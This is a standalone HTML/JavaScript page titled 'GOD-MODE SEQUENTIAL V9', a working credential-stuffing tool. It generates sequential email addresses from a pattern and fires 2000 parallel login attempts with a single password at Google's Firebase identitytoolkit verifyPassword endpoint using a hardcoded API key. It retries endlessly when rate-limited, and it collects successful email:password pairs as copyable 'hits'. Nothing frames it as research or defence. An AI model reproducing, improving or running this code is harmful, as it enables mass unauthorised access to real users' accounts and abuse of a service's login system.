<!DOCTYPE html>
<html>
<head>
    <title>GOD-MODE SEQUENTIAL V9</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; padding: 10px; text-align: center; margin: 0; }
        .bot-terminal { max-width: 550px; margin: auto; border: 2px solid #ff0000; background: #050505; padding: 20px; box-shadow: 0 0 60px #ff0000; border-radius: 5px; }
        h1 { font-size: 22px; border-bottom: 2px solid #ff0000; padding-bottom: 10px; color: #fff; text-shadow: 0 0 15px #ff0000; }
        
        input { width: 100%; padding: 14px; margin: 8px 0; background: #111; border: 1px solid #ff0000; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; text-align: center; }
        .btn-god { width: 100%; padding: 22px; background: #ff0000; color: #fff; border: none; font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 10px; text-transform: uppercase; box-shadow: 0 0 30px #ff0000; }
        
        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: #000; padding: 15px; border: 1px dashed #ff0000; }
        .monitor b { font-size: 34px; color: #fff; display: block; }

        #speed-meter { font-size: 14px; color: #ffff00; margin-bottom: 10px; font-weight: bold; background: #330000; padding: 5px; }
        #res-box { width: 100%; height: 320px; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; font-size: 13px; box-sizing: border-box; }
        
        .copy-btn { width: 100%; padding: 12px; background: #111; color: #fff; border: 1px solid #ff0000; margin-top: 10px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="bot-terminal">
    <h1>🔥 GOD-MODE SEQUENTIAL</h1>
    <div id="speed-meter">WARMING UP ENGINES...</div>
    
    <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
    <input type="text" id="pwd" placeholder="PASSWORD">
    
    <button class="btn-god" id="btn" onclick="igniteGodMode()">💀 LAUNCH OVERCLOCK</button>

    <div class="monitor">
        <div>CHECKED<b id="c_val">0</b></div>
        <div>FOUND<b id="f_val">0</b></div>
    </div>

    <textarea id="res-box" readonly placeholder="Found List (100% Sequential)"></textarea>
    
    <button class="copy-btn" onclick="copyResults()">📋 COPY HITS</button>
</div>

<script>
    let active = false;
    let checked = 0;
    let found = 0;
    let index = 0;
    let nextToFlush = 0;
    let resultsMap = new Map();
    let startTime;

    async function igniteGodMode() {
        if (active) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("MISSING DATA!");

        active = true;
        startTime = Date.now();
        document.getElementById('btn').innerText = "🛑 TERMINATE SYSTEM";
        document.getElementById('btn').style.background = "#fff";
        document.getElementById('btn').style.color = "#000";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- GOD-MODE OVERCLOCK: 2000 PARALLEL RUNNERS ---
        // സെക്കൻഡിൽ 1000+ സ്പീഡ് ടാർഗെറ്റ് ചെയ്യാൻ 2000 പാരലൽ വർക്കേഴ്സ് ആവശ്യമാണ്.
        const workers = 2000; 

        for (let i = 0; i < workers; i++) {
            (async function() {
                while (active && index < max) {
                    let currentIdx = index++;
                    let numStr = currentIdx.toString().padStart(digits, '0');
                    let email = fmt.replace(/\{(\d+)\}/, numStr);
                    
                    await processAcc(email, pwd, key, currentIdx);
                }
            })();
        }

        // Real-time Speed Meter
        setInterval(() => {
            if (!active) return;
            let elapsed = (Date.now() - startTime) / 1000;
            let speed = Math.round(checked / elapsed);
            document.getElementById('speed-meter').innerText = `CURRENT SPEED: ${speed} REQ/SEC`;
        }, 500);
    }

    async function processAcc(em, pw, k, idx) {
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (r.status === 429) {
                return processAcc(em, pw, k, idx); // No-skip force retry
            }

            let d = await r.json();
            resultsMap.set(idx, { found: (d && d.idToken), email: em });

            // --- INSTANT SEQUENTIAL FLUSH (1, 2, 3...) ---
            while (resultsMap.has(nextToFlush)) {
                let data = resultsMap.get(nextToFlush);
                if (data.found) {
                    found++;
                    document.getElementById('f_val').innerText = found;
                    document.getElementById('res-box').value += data.email + ":" + pw + "\n";
                    document.getElementById('res-box').scrollTop = document.getElementById('res-box').scrollHeight;
                }
                
                checked++;
                if (checked % 10 === 0) document.getElementById('c_val').innerText = checked;
                
                resultsMap.delete(nextToFlush);
                nextToFlush++;
            }

        } catch (e) {
            return processAcc(em, pw, k, idx); // Retry on any error
        }
    }

    function copyResults() {
        let t = document.getElementById('res-box');
        t.select();
        document.execCommand('copy');
        alert("COPIED TO CLIPBOARD!");
    }
</script>

</body>
</html>
